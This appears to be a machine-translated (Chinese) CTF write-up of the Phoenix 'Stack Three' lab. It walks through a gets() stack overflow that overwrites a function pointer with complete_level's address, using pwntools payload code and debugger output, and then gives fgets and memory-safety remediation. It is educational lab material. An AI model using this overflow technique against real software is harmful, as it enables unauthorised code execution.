<html>
<head>
<title>Phoenix Challenges — Stack Three</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">凤凰挑战—堆栈三</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/phoenix-challenges-stack-three-984e0434356b?source=collection_archive---------8-----------------------#2022-12-05">https://infosecwriteups.com/phoenix-challenges-stack-three-984e0434356b?source=collection_archive---------8-----------------------#2022-12-05</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/25c0eab8264250ef2ce6294c9cf0a2ee.png" data-original-src="https://miro.medium.com/v2/resize:fit:550/format:webp/1*VF7g7NCBHBIU3Wxw8XIjmA.png"/></div></figure><h1 id="8e6f" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">挑战</h1><p id="0d1f" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">挑战的描述和源代码位于<a class="ae lq" href="https://exploit.education/phoenix/stack-three/" rel="noopener ugc nofollow" target="_blank">这里</a>。它和所有其他Phoenix二进制文件都位于<strong class="ku ir"> /opt/phoenix/amd64 </strong>目录中。一篇<a class="ae lq" href="https://medium.com/@secnate/phoenix-challenges-getting-set-up-a2783e0616c6" rel="noopener">的前一篇文章</a>描述了如何为这些挑战设置虚拟机，如果还没有这样做的话。</p><h1 id="953a" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">文件</h1><p id="50cf" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">我们使用下面的内容来检查<em class="lr">堆栈三个</em>文件的属性。</p><pre class="ls lt lu lv gt lw lx ly bn lz ma bi"><span id="dcdd" class="mb jv iq lx b be mc md l me mf">nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-three$ file /opt/phoenix/amd64/stack-three<br/><br/>/opt/phoenix/amd64/stack-three: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped</span></pre><p id="688f" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">它有</p><ol class=""><li id="9394" class="ml mm iq ku b kv mg kz mh ld mn lh mo ll mp lp mq mr ms mt bi translated">setuid<strong class="ku ir">属性。它表示该程序是以所有者的权限运行的。如果文件的所有者是root用户(在本例中不是)，则可以使用它来提升权限。</strong></li><li id="1e2f" class="ml mm iq ku b kv mu kz mv ld mw lh mx ll my lp mq mr ms mt bi translated">由<strong class="ku ir">未剥离</strong>属性指示的符号。这意味着调试和分析二进制文件的人可以看到原始的变量和函数名。这对我们以后会有帮助。</li><li id="2bb2" class="ml mm iq ku b kv mu kz mv ld mw lh mx ll my lp mq mr ms mt bi translated">在执行过程中动态链接的共享库。这有助于识别所使用的标准函数。</li><li id="64bb" class="ml mm iq ku b kv mu kz mv ld mw lh mx ll my lp mq mr ms mt bi translated">一个<strong class="ku ir"> ELF 64位LSB可执行文件，x86–64。</strong> ELF是文件格式，64位是字长，LSB表示是little-endian(首先使用最低有效字节)，使用x86–64指令集。</li></ol><h1 id="8cc0" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">目标</h1><p id="ff1d" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">查看堆栈三的C代码，我们看到<strong class="ku ir">局部变量</strong>结构的<strong class="ku ir"> fp </strong>指针变量被初始化为空。目标是篡改它的值，并将其设置为<strong class="ku ir"> complete_level() </strong>函数的内存地址，使其启动。</p><h1 id="fd1b" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">相关概念</h1><p id="4d84" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">有必要了解<em class="lr">堆栈</em>内存是如何工作的。如果有人感兴趣，可以阅读我为凤凰堆栈零挑战写的文章<a class="ae lq" rel="noopener ugc nofollow" target="_blank" href="/phoenix-challenges-stack-zero-f8743cc871ed">以获得全面的解释。</a></p><p id="5bcd" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">也有必要简单介绍一下指针。虽然是许多计算机科学学生的克星，但这个想法很简单:它们是内存位置的地址。当需要读取或更新数据时，程序会转到指定的内存位置进行处理。</p><p id="fe47" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">下面是一个示例，说明<strong class="ku ir"> ptr </strong>如何与整数变量<strong class="ku ir"> var </strong>相关联。<strong class="ku ir"> ptr </strong>的值是<strong class="ku ir"> var </strong>变量的内存地址。当<strong class="ku ir"> ptr </strong>被<strong class="ku ir"> *ptr </strong>操作解引用时，程序获取其<strong class="ku ir"> 0x7fffa0757dd4 </strong>值，并访问存储值。在这种情况下，它是整数10。</p><figure class="ls lt lu lv gt jr gh gi paragraph-image"><div class="gh gi mz"><img src="../Images/d31ac21c904f640bccdddbe929a56601.png" data-original-src="https://miro.medium.com/v2/resize:fit:1244/format:webp/1*Gd1s7eT8WN1qT7PywPVzHw.png"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated"><strong class="bd jw">资料来源:</strong><em class="ne"/>图书<em class="ne">【c++数据结构】</em>，第2.2章</figcaption></figure><p id="251f" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">应该注意，存储在指针引用的存储单元中的数据是<em class="lr">而不是需要为整数的</em>。它可以是数组、字符、字符串、函数，甚至是对象！在这个挑战中，我们将使用一个指针来引用一个函数开始的位置。</p><p id="f19d" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">另一个要知道的概念是地址空间布局随机化(ASLR)。它用于强化编译后的可执行文件，使其不易受到攻击。每个可执行文件都包含一个堆栈、链接或复制的库代码、一个堆和用于执行的程序代码。如果这些组件位于相同或容易预测的位置，攻击者可以将程序执行流重定向到目标代码所在的位置。ASLR的目标是通过将二进制文件的组件位置随机化到猜测它们的位置不可行的程度来扰乱开发过程。</p><figure class="ls lt lu lv gt jr gh gi paragraph-image"><div class="gh gi nf"><img src="../Images/07d0bb95246f44cc65b598b307440f1e.png" data-original-src="https://miro.medium.com/v2/resize:fit:946/format:webp/1*sY1WNvRlc06L1nCAOyGOGg.png"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated"><strong class="bd jw">资料来源:</strong>丹尼尔·洛佩兹·阿扎尼亚关于ASLR、卡斯尔和卡尔之间<em class="ne">差异的博客文章</em></figcaption></figure><p id="dbf1" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">注意，每次执行一个二进制代码，ASLR都会改变组件的位置。</p><h1 id="ed6b" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">虫子</h1><p id="8a4b" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">所有<em class="lr">堆栈三的</em>数据都存储在堆栈上，其中<em class="lr">局部变量</em>结构的<em class="lr">缓冲区</em>和<em class="lr"> fp </em>函数指针是相邻的邻居。存入缓冲区的多余数据将溢出到<em class="lr"> fp </em>指针并影响其值。这种溢出是由于<strong class="ku ir"> gets() </strong>函数将基于控制台的输入写入<em class="lr"> locals.buffer </em>而不执行任何边界检查造成的。</p><h1 id="9660" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">利用</h1><p id="f3aa" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">我们首先需要检查二进制文件是否有任何反利用防御措施。Checksec是Pwntools套件中的一个漂亮的脚本，它允许我们这样做:</p><pre class="ls lt lu lv gt lw lx ly bn lz ma bi"><span id="b394" class="mb jv iq lx b be mc md l me mf">nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-three$ checksec /opt/phoenix/amd64/stack-three<br/>[*] '/opt/phoenix/amd64/stack-three'<br/>    Arch:     amd64-64-little<br/>    RELRO:    No RELRO<br/>    Stack:    No canary found<br/>    NX:       NX disabled<br/>    PIE:      No PIE (0x400000)<br/>    RWX:      Has RWX segments<br/>    RPATH:    b'/opt/phoenix/x86_64-linux-musl/lib'</span></pre><p id="3732" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">没有启用。特别感兴趣的是<strong class="ku ir">饼图</strong>字段，它指示ASLR是否启用。因为不是这样，<strong class="ku ir"> complete_level() </strong>函数将总是在同一个内存位置。这简化了开发过程；一旦找到函数的位置，我们就可以将它传递给<strong class="ku ir">局部变量</strong>结构的<strong class="ku ir"> fp </strong>变量。</p><p id="2319" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated"><strong class="ku ir"> complete_level() </strong>函数的地址可以用以下任一方法找到</p><ul class=""><li id="de3e" class="ml mm iq ku b kv mg kz mh ld mn lh mo ll mp lp ng mr ms mt bi translated"><strong class="ku ir">Pwndbg:</strong><em class="lr">栈三</em>二进制被加载到pwn dbg，我们打印<strong class="ku ir"> complete_level </strong>符号的值。因为编译后的二进制文件具有未剥离的<strong class="ku ir">属性，调试器可以找到变量和函数名，并打印它们的地址:</strong></li></ul><pre class="ls lt lu lv gt lw lx ly bn lz ma bi"><span id="258e" class="mb jv iq lx b be mc md l me mf">nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-three$ gdb /opt/phoenix/amd64/stack-three<br/>GNU gdb (Ubuntu 12.0.90-0ubuntu1) 12.0.90<br/>Copyright (C) 2022 Free Software Foundation, Inc.<br/>License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;<br/>This is free software: you are free to change and redistribute it.<br/>There is NO WARRANTY, to the extent permitted by law.<br/>Type "show copying" and "show warranty" for details.<br/>This GDB was configured as "x86_64-linux-gnu".<br/>Type "show configuration" for configuration details.<br/>For bug reporting instructions, please see:<br/>&lt;https://www.gnu.org/software/gdb/bugs/&gt;.<br/>Find the GDB manual and other documentation resources online at:<br/>    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.<br/><br/>For help, type "help".<br/>Type "apropos word" to search for commands related to "word"...<br/>pwndbg: loaded 196 commands. Type pwndbg [filter] for a list.<br/>pwndbg: created $rebase, $ida gdb functions (can be used with print/break)<br/>Reading symbols from /opt/phoenix/amd64/stack-three...<br/>(No debugging symbols found in /opt/phoenix/amd64/stack-three)<br/>pwndbg&gt; p complete_level<br/>$1 = {&lt;text variable, no debug info&gt;} 0x40069d &lt;complete_level&gt;</span></pre><ul class=""><li id="6298" class="ml mm iq ku b kv mg kz mh ld mn lh mo ll mp lp ng mr ms mt bi translated"><strong class="ku ir"> Objectdump: </strong>这是一个Linux命令行实用程序，用于显示关于Linux目标文件的信息。我们可以使用它的反汇编功能来显示<strong class="ku ir"> complete_level() </strong>函数的汇编代码和内存位置:</li></ul><pre class="ls lt lu lv gt lw lx ly bn lz ma bi"><span id="4e74" class="mb jv iq lx b be mc md l me mf">nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-three$ objdump -d /opt/phoenix/amd64/stack-three<br/>000000000040069d &lt;complete_level&gt;:<br/>  40069d:	55                   	push   %rbp<br/>  40069e:	48 89 e5             	mov    %rsp,%rbp<br/>  4006a1:	bf 90 07 40 00       	mov    $0x400790,%edi<br/>  4006a6:	e8 45 fe ff ff       	call   4004f0 &lt;puts@plt&gt;<br/>  4006ab:	bf 00 00 00 00       	mov    $0x0,%edi<br/>  4006b0:	e8 5b fe ff ff       	call   400510 &lt;exit@plt&gt;</span></pre><p id="71f9" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">这两种方法为我们提供了相同的信息:<strong class="ku ir"> complete_level() </strong>函数从<strong class="ku ir"> 0x40069d开始。</strong></p><p id="d89b" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">这个漏洞利用过程将会很快，因为<em class="lr">堆栈三</em>基本上与<em class="lr">堆栈零</em>挑战相同。[那些不熟悉<a class="ae lq" href="https://secnate.github.io/ctf/phoenix/phoenix-stack-zero/" rel="noopener ugc nofollow" target="_blank">我的Stack Zero challenge解决方案</a>的人可能想回顾一下这个过程的详细历史背景]</p><p id="beec" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">是时候利用这个漏洞了。<em class="lr"> exploit.py </em>文件第14行的有效负载是</p><pre class="ls lt lu lv gt lw lx ly bn lz ma bi"><span id="f28e" class="mb jv iq lx b be mc md l me mf">payload = cyclic(64) + p64(0xdeadbeef)</span></pre><p id="8cba" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">它在<em class="lr"> exploit.py </em>文件的第24行被传递到stack-three程序的执行中</p><pre class="ls lt lu lv gt lw lx ly bn lz ma bi"><span id="780e" class="mb jv iq lx b be mc md l me mf">p.sendline(payload)</span></pre><p id="e8fe" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">好的，我创建了一个基本的漏洞，并通过命令行输入把它传了进来。下一步是测试<strong class="ku ir"> 0xdeadbeef </strong>是否用方便包含的打印输出完全覆盖了<strong class="ku ir"> fp </strong>变量:</p><pre class="ls lt lu lv gt lw lx ly bn lz ma bi"><span id="c353" class="mb jv iq lx b be mc md l me mf">nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-three$ ./exploit.py<br/>Launching The Stack Three Exploit!<br/>[!] Could not find executable 'stack-three' in $PATH, using '/opt/phoenix/amd64/stack-three' instead<br/>[+] Starting local process '/opt/phoenix/amd64/stack-three': pid 6348<br/>[*] Switching to interactive mode<br/>Welcome to phoenix/stack-three, brought to you by https://exploit.education<br/>calling function pointer @ 0xdeadbeef<br/>[*] Got EOF while reading in interactive<br/>$</span></pre><p id="513d" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">确实如此。最后一步是用<strong class="ku ir"> 0x40069d </strong>替换有效载荷的0xdeadbeef值:</p><pre class="ls lt lu lv gt lw lx ly bn lz ma bi"><span id="4078" class="mb jv iq lx b be mc md l me mf">nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-three$ ./exploit.py<br/>Launching The Stack Three Exploit!<br/>[!] Could not find executable 'stack-three' in $PATH, using '/opt/phoenix/amd64/stack-three' instead<br/>[+] Starting local process '/opt/phoenix/amd64/stack-three': pid 8404<br/>[*] Switching to interactive mode<br/>[*] Process '/opt/phoenix/amd64/stack-three' stopped with exit code 0 (pid 8404)<br/>Welcome to phoenix/stack-three, brought to you by https://exploit.education<br/>calling function pointer @ 0x40069d<br/>Congratulations, you've finished phoenix/stack-three :-) Well done!<br/>[*] Got EOF while reading in interactive<br/>$</span></pre><p id="24b2" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">漏洞代码可以在我的<a class="ae lq" href="https://github.com/secnate/Exploit-Education-CTFs" rel="noopener ugc nofollow" target="_blank"> Github知识库</a>中找到。</p><h1 id="8acd" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">补救</h1><p id="2f4f" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">为了防止这样的内存损坏错误，我会敦促开发人员不要用C和C++编写，而要过渡到具有自动内存管理的语言，比如Python或Rust。我的CTF文章的追随者知道这是我经常重复的一句话。</p><p id="4ab3" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">但不仅仅是我。记忆不安全语言带来的风险如此普遍和严重，以至于NSA觉得有必要大声说出来。它在2022年11月发布了一份报告，敦促组织一劳永逸地放弃内存不安全的语言:</p><blockquote class="nh ni nj"><p id="4c95" class="ks kt lr ku b kv mg kx ky kz mh lb lc nk mi lf lg nl mj lj lk nm mk ln lo lp ij bi translated">美国国家安全局建议尽可能使用记忆安全的语言。虽然对非内存安全语言使用附加保护和使用内存安全语言并不能提供针对可利用内存问题的绝对保护，但它们确实提供了相当大的保护…</p><p id="fd6b" class="ks kt lr ku b kv mg kx ky kz mh lb lc nk mi lf lg nl mj lj lk nm mk ln lo lp ij bi translated">使用内存安全语言有助于防止程序员引入某些类型的内存相关问题。内存作为计算机语言的一部分被自动管理；它不依赖程序员添加代码来实现内存保护。该语言使用编译时和运行时检查的组合来建立自动保护。这些固有的语言特性防止程序员无意中引入内存管理错误。内存安全语言的例子包括C#、Go、Java、Ruby、Rust和Swift。</p></blockquote><p id="18a3" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">如果除了使用C别无选择，我会警告不要使用<a class="ae lq" href="https://www.tutorialspoint.com/c_standard_library/c_function_gets.htm" rel="noopener ugc nofollow" target="_blank"> gets() </a>函数从命令行提取输入。</p><p id="b476" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">应该使用<a class="ae lq" href="https://cplusplus.com/reference/cstdio/fgets/" rel="noopener ugc nofollow" target="_blank"> fgets() </a>函数。它解析命令行输入并将其放入目标缓冲区，同时执行适当的边界检查。</p><p id="46e9" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">源代码的<code class="fe nn no np lx b">gets(locals.buffer);</code>行将是</p><pre class="ls lt lu lv gt lw lx ly bn lz ma bi"><span id="5be7" class="mb jv iq lx b be mc md l me mf">fgets(locals.buffer, 64, stdin);</span></pre><p id="1e99" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">使用<strong class="ku ir"> fgets </strong>的额外好处是，它会自动用终止空字符(" \0 ")终止缓冲区。程序员可能会忘记手动插入这样的字符。因此，在这个挑战中，只有63个字符从命令行读入缓冲区，第64个字符是“\0”。</p><p id="4d37" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">用空字符终止缓冲区对于防止缓冲区过度读取漏洞至关重要。这些包括数据泄漏，因为读取缓冲区的函数没有遇到终止字符，并继续越过缓冲区的末端进入相邻的内存。其中包括臭名昭著的<a class="ae lq" href="https://owasp.org/www-community/vulnerabilities/Heartbleed_Bug" rel="noopener ugc nofollow" target="_blank"> 2014 OpenSSL Heartbleed bug。</a></p></div><div class="ab cl nq nr hu ns" role="separator"><span class="nt bw bk nu nv nw"/><span class="nt bw bk nu nv nw"/><span class="nt bw bk nu nv"/></div><div class="ij ik il im in"><p id="4187" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">目前就这些。下次见！</p><p id="59c1" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated">这篇CTF挑战赛的文章最初发表在内森·帕夫洛夫斯基的个人博客上:<a class="ae lq" href="http://secnate.github.io/" rel="noopener ugc nofollow" target="_blank"> secnate.github.io </a></p><p id="8455" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated"><strong class="ku ir">来源:</strong></p><p id="b12c" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated"><a class="ae lq" href="https://eng.libretexts.org/Courses/Delta_College/C_-_Data_Structures/02%3A_C_Pointers/2.02%3A_How_to_use_a_pointer" rel="noopener ugc nofollow" target="_blank"><em class="lr">libre texts’</em>本书<em class="lr">《c++数据结构》</em>，第2.2章</a></p><p id="ce5f" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated"><a class="ae lq" href="https://www.daniloaz.com/en/differences-between-aslr-kaslr-and-karl/" rel="noopener ugc nofollow" target="_blank">丹尼尔·洛佩斯·阿扎尼亚的博客文章<em class="lr">ASLR、卡斯尔和卡尔之间的差异</em> </a></p><p id="f55b" class="pw-post-body-paragraph ks kt iq ku b kv mg kx ky kz mh lb lc ld mi lf lg lh mj lj lk ll mk ln lo lp ij bi translated"><a class="ae lq" href="https://www.nsa.gov/Press-Room/News-Highlights/Article/Article/3215760/nsa-releases-guidance-on-how-to-protect-against-software-memory-safety-issues/" rel="noopener ugc nofollow" target="_blank"> NSA发布关于如何防范软件内存安全问题的指南</a></p></div><div class="ab cl nq nr hu ns" role="separator"><span class="nt bw bk nu nv nw"/><span class="nt bw bk nu nv nw"/><span class="nt bw bk nu nv"/></div><div class="ij ik il im in"><h2 id="bb03" class="nx jv iq bd jw ny nz dn ka oa ob dp ke ld oc od ki lh oe of km ll og oh kq oi bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae lq" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>